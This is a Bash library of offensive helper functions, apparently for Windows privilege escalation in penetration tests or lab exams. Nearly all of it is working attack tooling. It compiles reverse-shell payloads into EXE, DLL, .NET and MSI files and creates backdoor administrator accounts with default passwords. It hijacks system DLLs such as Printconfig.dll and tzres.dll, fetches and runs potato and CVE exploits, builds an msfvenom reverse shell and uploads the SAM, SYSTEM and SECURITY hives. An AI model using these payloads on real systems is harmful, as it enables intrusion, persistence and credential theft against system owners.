#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
windows_escalate_strategy() {
    echo "If access is not powershell (net cat, winrm), try to get the password via responder"
    echo "start_responder"
    host_ip=$(get_host_ip)
    echo 'dir \\'$host_ip'\test'
    echo 'get_responder_ntlm'
    echo 'get_ntlm_password'
    echo 'If password available and RDP available, log in'
    echo 'run_xfreerdp'
    echo 'shell=$(get_powershell_reverse_shell)'
    echo 'cut and paste into a powershell prompt'
    echo 'alternatively, start a interactive powershell'
    echo "If you have powershell, run the following commands"
    echo "whoami /priv"
    echo "whoami /groups"
    echo "Get-LocalUser"
    echo "Get-LocalGroup"
    echo "Get-LocalGroupMember Administators"
    echo "systeminfo"
    echo "ipconfig /all"
    echo "route print"
    echo "netstat -ano"
    echo 'Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname'
    echo 'Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname'
    echo 'reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName'
    echo 'Get-Process'
    echo 'tasklist'
    echo 'Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue'
    echo 'dir /s /b | findstr /e "kdbx"'
    echo 'Search suspicious folders'    
    echo 'Get-ChildItem -Path C:\suspected_folder -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue'
    echo 'dir /s /b | findstr /e "txt ini"'
    echo 'Get-History'
    echo '(Get-PSReadlineOption).HistorySavePath'
    echo 'Type the history file'
    echo 'Type the transcript file if any'
    echo 'Use evil-winrm to connect to a ps session'
    echo 'Use automated enumeratio with winPEAS'
    echo 'cp /usr/share/peass/winpeas/winPEASx64.exe .'
    echo '$(generate_windows_download "winPEASx64.exe")'
    echo '.\winPEASx64.exe'
    echo "Service Binary Hijacking"
    echo "At this point, you must have a proper powershell session via rdp or otherwise"
    echo 'Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like "Running"}'
    echo 'wmic service where (state="Running") get Name,State,PathName'
    echo 'To see specific logonuser, sc qc servicename'
    echo 'run icacls to see if you have permission to modify/write the files'
    echo 'if you do, create the exe reverse shell'
    echo 'DLL Hijacking'
    echo 'Investigate the applications to see if therei is anything interesting'
    echo 'Unquoted service paths'
    echo 'Get-CimInstance -ClassName win32_service | Select Name,State,PathName'
    echo 'wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """"'
    echo 'net start'
    echo 'Check task scheduler'
    echo 'schtasks /query /fo LIST /v'
    echo 'Use windows exploits'

}

create_add_user() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        username="attacker"
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    cp "$SCRIPTDIR/../c/add_user.c" .
    sed -E -i 's/\{username\}/'"$username"'/g' add_user.c
    sed -E -i 's/\{password\}/'"$password"'/g' add_user.c
    x86_64-w64-mingw32-gcc -o add_user.exe add_user.c 
}

create_add_user_dll() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        username="attacker"
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    cp "$SCRIPTDIR/../c/add_user_dll.cpp" .
    sed -E -i 's/\{username\}/'"$username"'/g' add_user_dll.cpp
    sed -E -i 's/\{password\}/'"$password"'/g' add_user_dll.cpp
    x86_64-w64-mingw32-gcc -shared -o add_user.dll add_user_dll.cpp 
}

create_change_password() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        echo "Username is required for changing password."
        exit 1
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    cp "$SCRIPTDIR/../c/change_password.c" .
    sed -E -i 's/\{username\}/'"$username"'/g' change_password.c
    sed -E -i 's/\{password\}/'"$password"'/g' change_password.c
    x86_64-w64-mingw32-gcc -o change_password.exe change_password.c 
}

create_run_windows_shell_exe() {    
    shell=$(get_powershell_reverse_shell $1 $2)
    shell=$(escape_sed "$shell")
    cp "$SCRIPTDIR/../c/run_windows.c" run_windows_shell.c
    sed -E -i 's/\{command\}/'"$shell"'/g' run_windows_shell.c
    x86_64-w64-mingw32-gcc -o run_windows_shell.exe run_windows_shell.c 
}

create_run_windows_shell_dll() {
    shell=$(get_powershell_reverse_shell $1 $2)
    shell=$(escape_sed "$shell")
    cp "$SCRIPTDIR/../c/run_windows_dll.cpp" run_windows_shell_dll.cpp
    sed -E -i 's/\{command\}/'"$shell"'/g' run_windows_shell_dll.cpp
    x86_64-w64-mingw32-gcc -shared -o run_windows_shell.dll run_windows_shell_dll.cpp 
}

build_dotnet() {
    echo "Building dotnet project"   
    local dotnet_project_name="$1"
    if [[ -z "$dotnet_project_name" ]]; then
        echo "Project name is required"
        return 1
    fi  
    local dotnet_project_dir="$dotnet_project_name"
    #force all compilations to minimally have a project dir
    if [[ ! -d "$dotnet_project_dir" ]]; then
        echo "Project directory $dotnet_project_dir does not exist"
        return 1
    fi

    if [[ -z $target_build_dir ]]; then
        target_build_dir="build"
    fi
    if [[ ! -d $dotnet_project_dir/$target_build_dir ]]; then
        mkdir -p $dotnet_project_dir/$target_build_dir
    fi
    if [[ -z $target_zip_file ]]; then
        target_zip_file="build.zip"
    fi
    local build_command=""
    local zip_command="tar -a -c -f $target_zip_file $target_build_dir"

    if [[ -f "$target_zip_file.zip" ]]; then
        rm "$target_zip_file.zip"
    fi
    local project_zip_file="$dotnet_project_name.zip"
    zip -r "$project_zip_file" "$dotnet_project_dir"
    build_command+="tar -xf $project_zip_file && cd $dotnet_project_name && "
    zip_command="cd $dotnet_project_name && $zip_command"
    target_zip_file="$dotnet_project_name/$target_zip_file"
    
    local publish_option=""
    if [[ ! -z "$single_executable" ]] && [[ "$single_executable" == "true" ]]; then
        echo "Building single executable"
        publish_option="-p:PublishSingleFile=true"
    fi
    local dotnet_project_file=""    
    if [[ ! -z $dotnet_command ]] && [[ $dotnet_command == "publish" ]] ; then
        dotnet_project_file=$dotnet_project_name.csproj
        if [[ ! -f "$dotnet_project_dir/$dotnet_project_file" ]]; then
            echo "Project file $dotnet_project_file does not exist in the project directory"
            return 1
        fi
        build_command+="dotnet publish $dotnet_project_file -c Release -r win-x64 --self-contained false $publish_option -o build $dotnet_additional_options"
        output_file="$dotnet_project_name.exe"
    elif [[ ! -z $dotnet_command ]] && [[ $dotnet_command == "csc" ]] ; then
        dotnet_project_file=$dotnet_project_name.cs
        if [[ ! -f "$dotnet_project_dir/$dotnet_project_file" ]]; then
            echo "Project file $dotnet_project_file does not exist in the project directory"
            return 1
        fi
        build_command+="C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe $dotnet_project_file $dotnet_additional_options"
        build_command+=" && move $dotnet_project_name.exe build\\$dotnet_project_name.exe"
        output_file="$dotnet_project_name.exe"
    else
        echo "Defaulting to dotnet build"
        dotnet_project_file=$dotnet_project_name.csproj
        if [[ ! -f "$dotnet_project_dir/$dotnet_project_file" ]]; then
            echo "Project file $dotnet_project_file does not exist in the project directory"
            return 1
        fi
        build_command+="dotnet build $dotnet_project_file -c Release -o build $dotnet_additional_options"
        csproj=$(cat $dotnet_project_dir/$dotnet_project_file)
        if [[ $csproj == *"Exe"* ]]; then
            output_file="$dotnet_project_name.exe"
        else
            output_file="$dotnet_project_name.dll"
        fi
    fi   
    echo "Output file: $output_file"
    echo "Build command: $build_command"
    scp "$project_zip_file" "$windows_username@$windows_computername:~/$project_zip_file"
    ssh $windows_username@$windows_computername "$build_command"
    ssh $windows_username@$windows_computername "$zip_command"
    scp "$windows_username@$windows_computername:~/$target_zip_file" .

}

create_run_windows_exe() {
    local command=""
    if [[ ! -z "$cmd" ]] && [[ -z "$command" ]]; then
        command="$cmd"
    fi
    if [[ -z "$command" ]]; then
        command=$(get_powershell_interactive_shell)
    fi
    if [ -z "$run_windows_filename" ]; then
        run_windows_filename="run_windows"
    fi
    local output_dir="."
    if [[ ! -z "$temp_dir" ]]; then
        output_dir="$temp_dir"
    fi
    local string_length=${#command}
    echo "The length of the cmd string is: $string_length" >> $trail_log
    command=$(echo $command | sed -E 's/"/\\"/g')
    command=$(escape_sed "$command")
    cp "$SCRIPTDIR/../c/run_windows.c" $run_windows_filename.c
    sed -E -i 's/\{command\}/'"$command"'/g' $run_windows_filename.c
    x86_64-w64-mingw32-gcc -o $run_windows_filename.exe $run_windows_filename.c
    generate_windows_download "$run_windows_filename.exe" "$output_dir\\$run_windows_filename.exe"
    echo "$output_dir\\$run_windows_filename.exe"
}

create_run_windows_dll() {
    local command=""
    if [[ ! -z "$cmd" ]] && [[ -z "$command" ]]; then
        command="$cmd"
    fi
    if [[ -z "$command" ]]; then
        command=$(get_powershell_interactive_shell)
    fi
    if [ -z "$run_windows_filename" ]; then
        run_windows_filename="run_windows"
    fi
    string_length=${#command}
    echo "The length of the cmd string is: $string_length" >> $trail_log
    command=$(echo $command | sed -E 's/"/\\"/g')
    command=$(escape_sed "$command")
    cp "$SCRIPTDIR/../c/run_windows_dll.cpp" $run_windows_filename.cpp
    sed -E -i 's/\{command\}/'"$command"'/g' $run_windows_filename.cpp
    x86_64-w64-mingw32-gcc -shared -o $run_windows_filename.dll $run_windows_filename.cpp
    generate_windows_download "$run_windows_filename.dll"
}

generate_windows_unzip() {
    if [[ -z "$1" ]]; then
        echo "Archive file is required"
        return 1
    fi
    local archive_file="$1"
    local destination_path="$2"
    if [[ -z "$destination_path" ]]; then
        destination_path="."
    fi
    echo "Expand-Archive -Path $archive_file -DestinationPath $destination_path -Force;"
}

create_dotnet_web() {
    local project_name="dotnet_web_project"
    if [[ ! -d "$project_name" ]]; then
        mkdir "$project_name"
    fi
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_reverse_shell)
    fi
    pushd "$project_name" || return 1
    cp "$SCRIPTDIR/../cs/Program.cs" Program.cs.original
    cp "$SCRIPTDIR/../cs/web.csproj" $project_name.csproj
    cp "$SCRIPTDIR/../cs/Startup.cs" Startup.cs
    cp "$SCRIPTDIR/../cs/WebApp.cs" WebApp.cs
    cp "$SCRIPTDIR/../cs/CommandController.cs" CommandController.cs
    dotnet clean
    cp Program.cs.original Program.cs        
    local command=$(escape_sed "$cmd")
    sed -E -i 's/\{command\}/'"$command"'/g' Program.cs
    dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
    popd || return 1
    if [[ -f "$project_name.zip" ]]; then
        rm "$project_name.zip"
    fi
    zip -r $project_name.zip $project_name
    generate_windows_download "$project_name.zip"
    generate_windows_unzip "$project_name.zip"


}

create_dotnet() {
    local project_name="dotnet_project"
    if [[ ! -d "$project_name" ]]; then
        mkdir "$project_name"
    fi
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_reverse_shell)
    fi
    pushd "$project_name" || return 1
    cp "$SCRIPTDIR/../cs/Program.cs" Program.cs.original
    cp "$SCRIPTDIR/../cs/cs.csproj" $project_name.csproj
    dotnet clean
    cp Program.cs.original Program.cs        
    local command=$(escape_sed "$cmd")
    sed -E -i 's/\{command\}/'"$command"'/g' Program.cs
    dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true
    popd || return 1
    if [[ -f "$project_name.zip" ]]; then
        rm "$project_name.zip"
    fi
    zip -r $project_name.zip $project_name
    generate_windows_download "$project_name.zip"
    powershell_extract_command

}

create_se_restore_abuse() {
    cp "$SCRIPTDIR/../c/SeRestoreAbuse.cpp" .
    x86_64-w64-mingw32-gcc -o SeRestoreAbuse.exe SeRestoreAbuse.cpp -lstdc++ -static
    generate_windows_download "SeRestoreAbuse.exe"
    if [[ -z $cmd ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    if [[ -z $temp_dir ]]; then
        temp_dir="C:\\Windows\\Temp"
    fi
    create_run_windows_exe
    echo ".\\SeRestoreAbuse.exe $temp_dir\\run_windows.exe"
}

create_restart_windows() {
    cp "$SCRIPTDIR/../c/RestartWindows.cpp" .
    x86_64-w64-mingw32-gcc -o RestartWindows.exe RestartWindows.cpp -lstdc++ -static
    generate_windows_download "RestartWindows.exe"
}

create_msi_installer() {
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_reverse_shell)
    fi
    local wix_directory="wix"
    if [[ ! -d "$wix_directory" ]]; then
        mkdir "$wix_directory"
    fi
    pushd "$wix_directory" || return 1
    local command=$(escape_sed "$cmd")    
    cp "$SCRIPTDIR/../xml/wix_msi.xml" wix_msi.wxs
    sed -E -i 's/\{command\}/'"$command"'/g' wix_msi.wxs
    create_run_windows_exe
    scp run_windows.exe "$windows_username@$windows_computername:c:/users/$windows_username/run_windows.exe"
    scp wix_msi.wxs "$windows_username@$windows_computername:c:/users/$windows_username/wix_msi.wxs"
    local run_wix="wix build wix_msi.wxs"
    ssh $windows_username@$windows_computername "$run_wix"
    scp "$windows_username@$windows_computername:c:/users/$windows_username/wix_msi.msi" . 
    popd || return 1
    generate_windows_download "$wix_directory/wix_msi.msi" "installer.msi"
}

netuser_create_admin_user() {
    if [[ -z "$admin_username" ]]; then
        admin_username="hacker"
    fi
    if [[ -z "$admin_password" ]]; then
        admin_password="Password123!"
    fi
    local cmd="net user $admin_username $admin_password /add"
    echo "$cmd"
}

netuser_add_admin_user_to_administrators() {
    if [[ -z "$admin_username" ]]; then
        admin_username="hacker"
    fi
    local cmd="net localgroup Administrators $admin_username /add"
    echo "$cmd"
}

netuser_add_admin() {
    echo 'REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'
    netuser_create_admin_user
    netuser_add_admin_user_to_administrators
}

netuser_change_user_password() {
    local username="$1"
    local password="$2"
    if [ -z "$username" ]; then
        echo "Username is required for changing password."
        exit 1
    fi
    if [ -z "$password" ]; then
        password="Password123!"
    fi
    local cmd="net user $username $password"
    echo "$cmd"
}

download_runas() {
    local url="https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip"
    if [[ ! -d runascs ]]; then
        mkdir runascs
    fi
    pushd runascs || return 1 
    echo "Downloading RunasCs tool."
    if [[ ! -f "RunasCs.exe" ]]; then
        wget "$url" -O runascs.zip >> $trail_log
        unzip runascs.zip >> $trail_log
    fi
    if [[ -z $username ]]; then
        echo "Username is required for RunasCs."
        return 1
    fi
    if [[ -z $password ]]; then
        echo "Password is required for RunasCs."
        return 1
    fi
    popd || return 1 >/dev/null
    generate_windows_download "runascs/RunasCs.exe" "RunasCs.exe"
}

perform_runas() {
    if [[ -z $cmd ]]; then
        cmd=$(get_powershell_interactive_shell)
        cmd=$(create_run_windows_exe)
        cmd="cd C:\windows\temp; $cmd"
        cmd=$(encode_powershell "$cmd")
    fi
    if [[ -z "$domain" ]]; then
        domain_option=""
    else
        domain_option="-d $domain"
    fi    
    echo ".\RunasCs.exe $domain_option $username $password \"$cmd\" $runas_additional_options;"

}

perform_semanagevolume_exploit() {
    local url="https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe"
    local exploit_dir="SeManageVolumeExploit"
    if [[ ! -d "$exploit_dir" ]]; then
        mkdir "$exploit_dir"
    fi
    pushd $exploit_dir || return 1
    if [[ ! -f "SeManageVolumeExploit.exe" ]]; then
        echo "Downloading SeManageVolumeExploit..." >> $trail_log
        wget "$url" -O SeManageVolumeExploit.exe >> $trail_log
    fi
    popd || return 1
    echo 'cd C:\windows\temp;'
    generate_windows_download "$exploit_dir/SeManageVolumeExploit.exe" "SeManageVolumeExploit.exe"    
    echo '.\SeManageVolumeExploit.exe;'
    create_run_windows_dll
    perform_printerconfig_dll_hijack
    perform_tzres_dll_hijack
    perform_wer_error_dll_hijack
}

perform_printerconfig_dll_hijack() {
    if [[ ! -z $create_dll ]] && [[ $create_dll == "true" ]]; then
        create_run_windows_dll
    fi
    #echo 'move C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.old.dll'
    echo "cd C:\windows\temp;"
    echo 'copy .\run_windows.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll;'
    echo '$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}");'
    echo '$object = [Activator]::CreateInstance($type);'
}

perform_tzres_dll_hijack() {
    if [[ ! -z $create_dll ]] && [[ $create_dll == "true" ]]; then
        create_run_windows_dll
    fi
    echo 'copy .\run_windows.dll C:\Windows\System32\wbem\tzres.dll'
    echo "systeminfo"
}

perform_wer_error_dll_hijack() {
    if [[ ! -z $create_dll ]] && [[ $create_dll == "true" ]]; then
        create_run_windows_dll
    fi
    local url="https://raw.githubusercontent.com/sailay1996/WerTrigger/refs/heads/master/bin/Report.wer"
    if [[ ! -f "Report.wer" ]]; then
        echo "Downloading WerTrigger..." >> $trail_log
        wget "$url" -O Report.wer >> $trail_log
    fi    
    generate_windows_download "Report.wer"
    echo "md c:\\programdata\\microsoft\\windows\\wer\reportqueue\\a_b_c_d_e"
    echo "copy .\Report.wer C:\\programdata\\microsoft\\windows\\wer\reportqueue\\a_b_c_d_e\\Report.wer"
    echo "copy .\run_windows.dll C:\\Windows\\System32\\phoneinfo.dll"
    echo "schtasks /run /tn \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\""
}

perform_create_schtasks() {
    create_run_windows_exe
    exe_filename=$run_windows_filename.exe
    echo "schtasks /create /tn \"MyTask\" /sc minute /mo 5 /tr \"C:\\Windows\\Temp\\$exe_filename\""

}

#=========================
#impersonation escalations
#=========================
#rotten potato
#juicy potato
#rougewinrm
#printspoofer
#https://github.com/itm4n/PrintSpoofer
#god potato
#sigma potato

perform_printspoofer() {
    local printspoofer_url="https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
    if [[ ! -f "printspoofer.exe" ]]; then
        echo "Downloading PrintSpoofer..." >> $trail_log
        wget "$printspoofer_url" -O printspoofer.exe >> $trail_log
    fi    
    temp_dir="C:\windows\temp"
    echo "cd $temp_dir;"
    generate_windows_download "printspoofer.exe"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    if [[ -z "$run_in_background" ]]; then
        run_in_background="true"
    fi
    if [[ "$run_in_background" == "true" ]]; then
        echo "cmd /c \"start /b $temp_dir\printspoofer.exe -c \"\"$cmd\"\"\""
    else
        echo ".\printspoofer.exe -c \"$cmd\""
    fi
}


perform_god_potato() {
    local god_potato_url="https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
    if [[ ! -f "god_potato.exe" ]]; then
        echo "Downloading GodPotato..." >> $trail_log
        wget "$god_potato_url" -O god_potato.exe >> $trail_log
    fi
    echo 'cd C:\windows\temp;'
    generate_windows_download "god_potato.exe"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    echo ".\god_potato.exe -cmd \"$cmd\""
}

perform_sigma_potato() {
    local sigma_potato_url="https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe"
    if [[ ! -f "sigma_potato.exe" ]]; then
        echo "Downloading SigmaPotato..." >> $trail_log
        wget "$sigma_potato_url" -O sigma_potato.exe >> $trail_log
    fi
    echo 'cd C:\windows\temp;'
    generate_windows_download "sigma_potato.exe"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    echo ".\sigma_potato.exe \"$cmd\""
}

#https://ohpe.it/juicy-potato/CLSID/

perform_juicy_potato(){

    local url=""
    if [[ -z "$target_arch" ]]; then
        target_arch="x64"
    fi
    if [[ -z "$target_clsid" ]]; then
        echo "No target CLSID specified, please set one from https://ohpe.it/juicy-potato/CLSID/"
        return 1
    fi
    if [[ "$target_arch" == "x64" ]]; then
        url="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
    else
        url="https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe"
    fi
    if [[ ! -f "JuicyPotato.exe" ]]; then
        echo "Downloading JuicyPotato..." >> $trail_log
        wget "$url" -O JuicyPotato.exe >> $trail_log
    fi
    echo 'cd C:\windows\temp;'
    generate_windows_download "JuicyPotato.exe"
    if [[ -z "$cmd" ]]; then
        cmd="whoami"
    fi
    echo ".\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c $cmd\" -t * -c $target_clsid"
}

perform_local_potato() {
    local url="https://github.com/decoder-it/LocalPotato/releases/download/v1.1/LocalPotato.zip"
    if [[ ! -f LocalPotato.zip ]]; then
        echo "Downloading LocalPotato..." >> $trail_log
        wget "$url" -O LocalPotato.zip >> $trail_log
        unzip LocalPotato.zip
    fi
    echo 'cd C:\windows\temp;'
    generate_windows_download "LocalPotato.exe"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    echo ".\LocalPotato.exe \"$cmd\""
}

#in casses the local system is running with restricted

perform_full_powers() {
    local url="https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe"
    if [[ ! -f FullPowers.exe ]]; then
        echo "Downloading FullPowers..." >> $trail_log
        wget "$url" -O FullPowers.exe >> $trail_log
    fi
    echo 'cd C:\windows\temp;'
    generate_windows_download "FullPowers.exe"
    echo '.\FullPowers.exe;'

}

#fujitsu cve-2018-16156
perform_cve_2018_16156() {
    echo "Exploit for Fujitsu CVE-2018-16156"
    local cve_dir="CVE-2018-16156"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || return 1
    if [[ ! -f 49382.ps1 ]]; then
        searchsploit -m 49382
    fi
    msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=$host_ip LPORT=$host_port
    echo 'cd c:\windows\temo;'
    generate_windows_download "$cve_dir/49382.ps1" "49382.ps1"
    generate_windows_download "$cve_dir/UninOldIS.dll" "UninOldIS.dll"
    popd || return 1
    zip -r $cve_dir.zip $cve_dir
    generate_windows_download "$cve_dir.zip"

}

perform_ms10_092() {
    echo "Exploit for MS10-092"
    local cve_dir="MS10-092"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || return 1
    if [[ ! -f 15589.wsf ]]; then
        searchsploit -m 15589
    fi
    generate_windows_download "$cve_dir/15589.wsf" "15589.wsf"
    popd || return 1
    if [[ -f "$cve_dir.zip" ]]; then
        rm "$cve_dir.zip"
    fi
    zip -r $cve_dir.zip $cve_dir
    generate_windows_download "$cve_dir.zip"

}   

perform_ms11_046() {
    echo "Exploit for MS11-046"
    local cve_dir="MS11-046"
    local exploit_name="exploit.exe"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || return 1

    if [[ ! -f 40564.c ]]; then
        searchsploit -m 40564
    fi
    i686-w64-mingw32-gcc 40564.c -o $exploit_name -lws2_32
    popd || return 1
    if [[ -f "$cve_dir.zip" ]]; then
        rm "$cve_dir.zip"
    fi
    if [[ -f $cve_dir.zip ]]; then
        rm $cve_dir.zip
    fi  
    zip -r $cve_dir.zip $cve_dir
    generate_windows_download "$cve_dir.zip"

}

#argus password cracking cve-2022-25012

perform_cve_2022_25012() {
    echo "Downloading Argus password cracking tool"
    local url="https://github.com/s3l33/CVE-2022-25012/archive/refs/heads/main.zip"
    local cve_dir="CVE-2022-25012"
    local password_hash="$1"
    if [[ -z "$password_hash" ]]; then
        echo "Password hash is required"
        return 1
    fi

    if [[ ! -d "$cve_dir" ]]; then
        wget "$url" -O cve_2022_25012.zip
        unzip cve_2022_25012.zip
        mv CVE-2022-25012-main "$cve_dir"
        rm cve_2022_25012.zip
    fi
    pushd "$cve_dir" || return 1
    python CVE-2022-25012.py "$password_hash"
    popd || return 1
}

#hive nightmare
perform_cve_2021_36934() {
    local cve_dir="CVE-2021-36934"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || return 1
    local url="https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe"
    if [[ ! -f "HiveNightmare.exe" ]]; then
        echo "Downloading HiveNightmare..." >> $trail_log
        wget "$url" -O HiveNightmare.exe >> $trail_log
    fi
    popd || return 1
    generate_windows_download "$cve_dir/HiveNightmare.exe" "HiveNightmare.exe"
    echo ".\HiveNightmare.exe"
    upload_file "SAM"
    upload_file "SYSTEM"
    upload_file "SECURITY"
}